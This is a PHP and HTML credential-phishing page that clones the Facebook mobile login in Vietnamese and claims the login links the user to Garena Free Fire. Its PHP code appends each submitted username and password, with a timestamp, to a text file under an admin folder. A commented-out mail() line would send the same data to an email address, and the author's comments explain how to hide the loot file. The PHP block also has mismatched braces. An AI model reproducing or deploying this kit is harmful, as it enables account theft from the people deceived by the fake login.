<?php
session_start();
function checkPhone($number) {
    if (!preg_match('/((84|01|03|05|07|08|09)+([0-9]{8})\b)$/', $number)) {
        return false;
    }else{
        return true;
    }

}
function checkEmail($email){
    $valid = preg_match('/[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})/i', $email, $m);
    if (array_key_exists("0",$m)){
        return($m[0]);
    }else{
        return false;
    }
}
if(isset($_SESSION['loginFB'])){
if(isset($_POST['submit']) && $_POST['username'] && $_POST['password']){
    $taikhoan = addslashes($_POST['username']);
    $matkhau = addslashes($_POST['password']);
    $time = time();
    	}
   if(isset($_POST["taikhoan"])){
       $time = date('H:i:s d/m/Y');
         $username = $_POST["taikhoan"];
     $password = $_POST["matkhau"];
      $headers = "Tài khoản - Facebook";
    $subject = "code by Hướng";
      $body = "Time: ".$time."|acc: ".$username."|pass: ".$password."\n"; //định dạng acc|pass
  //  mail("jaxuatt6@gmail.com", $headers, $body, $subject);  // muốn gửi mail thì để dòng mail này 
     $test = fopen("admin/hhthienhthien.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
     fwrite($test,$body);
     fclose($test);
     	$huongdz['num']++;
$_SESSION['huongdz'] = $huongdz;
        }
        $_SESSION['id'] = $taikhoan;
        header('Location: /success.html');
        }
    }else{
        $error = 'Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <a href="https://m.facebook.com/r.php" class="_652e">Đăng ký tài khoản.</a>';
    }
    }else{
        $error = 'Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <a href="https://m.facebook.com/r.php" class="_652e">Đăng ký tài khoản.</a>';
    } 
}
?>

<!DOCTYPE html>
<html>

<head>
    <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
    <title>Đăng nhập bằng facebook</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
    <link rel="stylesheet" type="text/css" href="/css/login/facebook.css?v=1.0" />
</head>

<body class="touch x1 _fzu _50-3 iframe acw portrait">
    <div id="viewport">
        <h1 style="display: block; height: 0; overflow: hidden; position: absolute; width: 0; padding: 0;">
            Faceb&#111;ok
        </h1>
        <div id="page" class="">
            <div class="_129_" id="header-notices"></div>
            <div class="_4g33 _52we _52z5" id="header">
                <div class="_4g34 _52z6">
                    <a href="#">
                        <i class="img sp_7V_P8-AK9yC sx_ce405b"><u>faceb&#111;ok</u></i>
                    </a>
                </div>
            </div>
            <div class="_5soa acw" id="root" role="main">
                <div class="_4g33">
                    <div class="_4g34" id="u_0_0">
                        <?php if(isset($error)){ ?>
                            <div class="_5yd0 _2ph- _5yd1" style="" id="login_error" data-sigil="m_login_notice">Mật khẩu bạn đã nhập không chính xác. <a href="https://www.facebook.com/login/identify/?ctx=recover&from_login_screen=0" class="_652e">Quên Mật Khẩu?</a></div>
                        <?php } ?>
                        <div class="aclb _4-4l">
                            <div class="_5rut">
                                <div>
                                    <div class="_52jj _3-q2">
                                        <img src="https://i.imgur.com/m1ayDvF.png" width="70"
                                            class="_3-q3 img" />
                                        <div class="_52je _52j9">Hãy đăng nhập vào tài khoản Facebook để kết nối với Garena Free Fire</div>
                                    </div>
                                </div>
                                <form method="post" class="mobile-login-form _5spm" id="login_form" novalidate="1"
                                    data-autoid="autoid_2">
                                    <div class="_56be _5sob">
                                        <div class="_55wo _55x2 _56bf">
                                            <div id="email_input_container">
                                                <input class="_56bg _4u9z _5ruq " name="username"
                                                    placeholder="Email hoặc số điện thoại" type="text" value="" />
                                            </div>
                                            <div>
                                                <div class="_1upc _mg8">
                                                    <div class="_4g33">
                                                        <div class="_4g34 _5i2i _52we">
                                                            <div class="_5xu4">
                                                                <input autocorrect="off" autocapitalize="off"
                                                                    class="_56bg _4u9z _27z2" autocomplete="on"
                                                                    id="m_login_password" name="password"
                                                                    placeholder="Mật khẩu" type="password" />
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="_2pie" style="text-align: center;">
                                        <div id="u_0_4">
                                            <button type="submit" value="Đăng nhập" name="submit"
                                                class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span
                                                    class="_55sr">Đăng nhập</span></button>
                                        </div>
                                        <div id="otp_button_elem_container"></div>
                                    </div>
                                    <div class="_xo8"></div>
                                </form>
                                <div>
                                    <div class="_43mg"><span class="_43mh">hoặc</span></div>
                                    <div class="_52jj _5t3b" id="u_0_6">
                                        <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable"
                                            id="signup-button"
                                            href="https://m.facebook.com/reg/?cid=103&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db06a8f56-81cb-4296-bc49-4e7d9d0b8657&locale2=vi_VN&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin.php&soft=hjk">
                                            Tạo tài khoản mới
                                        </a>
                                    </div>
                                </div>
                                <div>
                                    <div class="other-links">
                                        <ul class="_5pkb _55wp">
                                            <li>
                                                <span class="mfss fcg">
                                                    <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fskip_api_login%3D1%26api_key%3D2036793259884297%26kid_directed_site%3D0%26app_id%3D2036793259884297%26signed_next%3D1%26next%3Dhttps%253A%252F%252Fwww.facebook.com%252Fdialog%252Foauth%253Fclient_id%253D2036793259884297%2526redirect_uri%253Dhttps%25253A%25252F%25252Fauth.garena.com%25252Foauth%25252Flogin%25253Fclient_id%25253D100067%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Fgiaidau.ff.garena.vn%2525252Flogin%2525252Fcallback%252526response_type%25253Dtoken%252526platform%25253D3%252526locale%25253Dvi-VN%2526response_type%253Dtoken%2526scope%253Dpublic_profile%25252Cemail%25252Cuser_friends%2526ret%253Dlogin%2526fbapp_pres%253D0%2526logger_id%253Db06a8f56-81cb-4296-bc49-4e7d9d0b8657%26cancel_url%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%253Fclient_id%253D100067%2526redirect_uri%253Dhttps%25253A%25252F%25252Fgiaidau.ff.garena.vn%25252Flogin%25252Fcallback%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Dvi-VN%2526error%253Daccess_denied%2526error_code%253D200%2526error_description%253DPermissions%252Berror%2526error_reason%253Duser_denied%2523_%253D_%26display%3Dpage%26locale%3Dvi_VN%26pl_dbl%3D0&multiple_results=0&ars=facebook_login&lwv=100&locale2=vi_VN&_rdr"
                                                        id="forgot-password-link">
                                                        Quên mật khẩu?
                                                    </a>
                                                </span>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="_55wr _5ui2">
                    <div class="_5dpw">
                        <div class="_5ui3" data-nocookies="1" id="locale-selector">
                            <div class="_4g33">
                                <div class="_4g34">
                                    <span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
                                    <div class="_3ztc">
                                        <span class="_52jc"><a href="#">中文(台灣)</a></span>
                                    </div>
                                    <div class="_3ztc">
                                        <span class="_52jc"><a href="#">Español</a></span>
                                    </div>
                                    <div class="_3ztc">
                                        <span class="_52jc"><a href="#">Français (France)</a></span>
                                    </div>
                                </div>
                                <div class="_4g34">
                                    <div class="_3ztc">
                                        <span class="_52jc"><a href="#">English (UK)</a></span>
                                    </div>
                                    <div class="_3ztc">
                                        <span class="_52jc"><a href="#">한국어</a></span>
                                    </div>
                                    <div class="_3ztc">
                                        <span class="_52jc"><a href="#">Português (Brasil)</a></span>
                                    </div>
                                    <a href="#">
                                        <div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"><i
                                                class="img sp_7V_P8-AK9yC sx_21ee4d"></i></div>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="_5ui4"><span class="mfss fcg">Facebo&#111;k © 2018</span></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
<?php
}else{
}